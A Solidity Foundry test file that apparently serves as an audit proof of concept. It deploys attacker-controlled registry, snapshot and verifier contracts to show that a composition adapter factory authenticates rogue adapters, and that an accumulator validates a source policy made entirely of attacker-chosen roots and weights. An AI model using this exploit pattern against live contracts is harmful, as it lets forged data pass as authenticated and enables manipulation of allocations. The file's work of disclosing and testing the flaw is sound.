// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test} from "forge-std/Test.sol";

import {
    CompositionSourceAdapter,
    CompositionSourceAdapterFactory
} from "src/composition/CompositionSourceAdapter.sol";
import {CompositionSourceAccumulator} from "src/composition/CompositionSourceAccumulator.sol";
import {TrustComposeValidator} from "src/params/TrustComposeValidator.sol";
import {ICompositionSourceAdapterFactory} from "interfaces/composition/ICompositionSourceAdapter.sol";
import {IInstanceRegistry} from "interfaces/registry/IInstanceRegistry.sol";
import {IMerkleSnapshot} from "interfaces/merkle/IMerkleSnapshot.sol";
import {IMerkleSnapshotProvenance} from "interfaces/merkle/IMerkleSnapshotProvenance.sol";

/// A registry the attacker deploys and fully controls. `CompositionSourceAdapterFactory.create`
/// takes the registry as a plain argument and never checks it against a canonical address.
contract AttackerRegistry {
    mapping(bytes32 => IInstanceRegistry.Instance) public rec;
    mapping(bytes32 => address) public auth;

    function set(bytes32 id, IInstanceRegistry.Instance memory r, address a) external {
        rec[id] = r;
        auth[id] = a;
    }

    function getInstance(bytes32 id) external view returns (IInstanceRegistry.Instance memory) {
        return rec[id];
    }

    function paramsAuthority(bytes32 id) external view returns (address) {
        return auth[id];
    }

    function isRegistered(bytes32) external pure returns (bool) {
        return true;
    }
}

/// A "snapshot" the attacker deploys and fully controls: it reports whatever score root,
/// total value and provenance the attacker wants.
contract AttackerSnapshot {
    address public immutable fakeVerifier;
    bytes32 public immutable fakeVKey;

    constructor(address v, bytes32 k) {
        fakeVerifier = v;
        fakeVKey = k;
    }

    function provenanceEnabled() external pure returns (bool) {
        return true;
    }

    function getStateCount() external pure returns (uint256) {
        return 1;
    }

    function getStateAtIndex(uint256) external view returns (IMerkleSnapshot.MerkleState memory s) {
        s.blockNumber = block.number;
        s.timestamp = block.timestamp;
        s.root = bytes32(uint256(0xBADBADBAD)); // attacker-chosen "proven" score root
        s.ipfsHash = bytes32(uint256(1));
        s.ipfsHashCid = "bafyAttackerChosen";
        s.totalValue = 1_000_000e18; // attacker-chosen weight in the composition
    }

    function getStateProvenance(uint256) external view returns (IMerkleSnapshotProvenance.StateProvenance memory p) {
        p.stateIndex = 0;
        p.checkpointId = 0;
        p.acceptedAtBlock = uint64(block.number);
        p.paramsHash = bytes32(uint256(2));
        p.verifier = fakeVerifier;
        p.verifierCodehash = fakeVerifier.codehash;
        p.programVKey = fakeVKey;
    }
}

/// A "verifier" that never verifies anything but answers `programVKey()`.
contract AttackerVerifier {
    function programVKey() external pure returns (bytes32) {
        return bytes32(uint256(0xdeadbeef));
    }
}

contract PashovOrch_CompositionAdapterRegistry is Test {
    CompositionSourceAdapterFactory internal adapterFactory;
    CompositionSourceAccumulator internal accumulator;

    bytes32 internal constant ALLOCATION = keccak256("allocation");
    bytes32 internal constant ADMITTED = keccak256("trust-graph");

    function setUp() public {
        adapterFactory = new CompositionSourceAdapterFactory();
        accumulator = new CompositionSourceAccumulator(
            ICompositionSourceAdapterFactory(address(adapterFactory)), address(this)
        );
    }

    function _mintRogueAdapter(bytes32 sourceId, bytes32 familyId)
        internal
        returns (CompositionSourceAdapter adapter, address snap)
    {
        AttackerVerifier v = new AttackerVerifier();
        AttackerSnapshot s = new AttackerSnapshot(address(v), v.programVKey());
        AttackerRegistry r = new AttackerRegistry();
        bytes32 instanceId = keccak256(abi.encode(sourceId, "rogue"));
        r.set(
            instanceId,
            IInstanceRegistry.Instance({
                program: ADMITTED, // claim to be an admitted trust-graph source
                snapshot: address(s),
                verifier: address(v),
                registryOrAccumulator: address(0xA11CE),
                paramsHash: bytes32(uint256(2))
            }),
            address(0xB0B) // any non-zero "params authority"
        );
        adapter = adapterFactory.create(
            IInstanceRegistry(address(r)), instanceId, sourceId, familyId, ALLOCATION, bytes32(uint256(7))
        );
        snap = address(s);
    }

    /// The factory's `isAdapter` allowlist is meant to reject an "ABI-compatible lookalike".
    /// It does not: the registry that anchors every trust claim is a caller-supplied argument.
    function test_rogueRegistryYieldsAuthenticatedAdapter() public {
        (CompositionSourceAdapter a, address snap) = _mintRogueAdapter(bytes32(uint256(1)), keccak256("fam"));

        assertTrue(adapterFactory.isAdapter(address(a)), "rogue adapter is factory-authenticated");
        assertEq(a.snapshot(), snap, "adapter points at an attacker-controlled snapshot");
        assertEq(a.programId(), ADMITTED, "adapter claims the admitted program id");
        assertEq(a.outputKind(), ALLOCATION);

        // ...and it reports an entirely attacker-chosen output as an authenticated capture.
        assertEq(a.readLatest().outputRoot, bytes32(uint256(0xBADBADBAD)));
        assertEq(a.readLatest().totalValue, 1_000_000e18);
    }

    /// The composition accumulator's policy validation accepts a manifest built entirely from
    /// rogue adapters: every check it performs is satisfied by attacker-chosen values.
    function test_accumulatorValidatesAllRogueSourcePolicy() public {
        (CompositionSourceAdapter a1, address s1) = _mintRogueAdapter(bytes32(uint256(1)), keccak256("famA"));
        (CompositionSourceAdapter a2, address s2) = _mintRogueAdapter(bytes32(uint256(2)), keccak256("famB"));

        bytes memory manifest = abi.encodePacked(
            bytes4(0x54474350), // "TGCP"
            uint16(1),
            uint64(block.chainid),
            uint8(2)
        );
        manifest = bytes.concat(
            manifest,
            abi.encodePacked(
                bytes32(uint256(1)), s1, keccak256("famA"), ADMITTED, uint64(5e17), uint64(1000), uint8(1)
            ),
            abi.encodePacked(
                bytes32(uint256(2)), s2, keccak256("famB"), ADMITTED, uint64(5e17), uint64(1000), uint8(1)
            )
        );

        address[] memory adapters = new address[](2);
        adapters[0] = address(a1);
        adapters[1] = address(a2);

        TrustComposeValidator.Commitment memory c = accumulator.validatePolicy(manifest, adapters);
        assertEq(c.sourceCount, 2, "accumulator accepted an all-rogue source policy");
        assertTrue(c.sourcePolicyRoot != bytes32(0));

        // And the frozen capture manifest the prover consumes carries the attacker's roots.
        emit log_named_bytes32("rogue source policy root", c.sourcePolicyRoot);
    }
}
